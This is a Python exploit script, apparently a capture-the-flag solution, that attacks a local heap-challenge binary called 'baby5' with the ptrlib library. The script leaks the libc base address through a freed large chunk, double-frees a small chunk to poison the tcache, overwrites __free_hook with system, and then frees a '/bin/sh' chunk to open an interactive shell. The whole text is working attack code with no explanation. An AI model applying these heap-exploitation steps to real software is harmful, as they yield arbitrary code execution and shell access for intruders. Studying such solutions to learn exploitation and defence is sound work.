from ptrlib import *

def add(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def edit(index, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("item: ")
    sock.sendline(str(index))
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def delete(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("item: ")
    sock.sendline(str(index))

def show(index):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("item: ")
    sock.sendline(str(index))
    sock.recvuntil("data: ")
    return sock.recvline().rstrip()

libc = ELF("./libc.so.6")
sock = Process("./baby5")
main_arena = 0x3ebc40
delta = 0x60

# leak libc base
add(0x500, "A")
add(0x18, "B")
add(0x8, "/bin/sh\x00")
delete(0)
libc_base = u64(show(0)) - main_arena - delta
dump("libc base = " + hex(libc_base))

# tcache poisoning
delete(1)
delete(1)
add(0x18, p64(libc_base + libc.symbol("__free_hook")))
add(0x18, "C")
add(0x18, p64(libc_base + libc.symbol("system")))

# get the shell
delete(2)

sock.interactive()
